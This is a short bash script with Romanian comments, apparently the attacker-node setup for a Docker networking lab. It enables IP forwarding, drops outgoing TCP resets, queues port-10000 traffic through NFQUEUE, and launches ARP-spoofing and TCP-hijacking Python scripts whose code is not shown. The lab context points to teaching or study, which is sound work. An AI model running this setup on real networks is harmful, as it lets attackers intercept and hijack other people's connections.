#!/bin/bash
set -x

# Activează IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Așteaptă routerul să pornească
until ping -c1 198.7.0.1 &> /dev/null; do
    echo "[middle.sh] Aștept routerul să devină disponibil..."
    sleep 1
done

# Rutează subnetul clientului
ip route add 172.7.0.0/16 via 198.7.0.1

# DNS extern temporar (pt. docker)
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# Blochează resetările TCP (pentru conexiuni hijack)
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

# Interceptează pachetele TCP port 10000 în NFQUEUE 1
iptables -I FORWARD -p tcp --dport 10000 -j NFQUEUE --queue-num 1

# Pornește spoofing și hijack
python3 /elocal/src/arp_spoofing.py &
python3 /elocal/src/tcp_hijack.py &
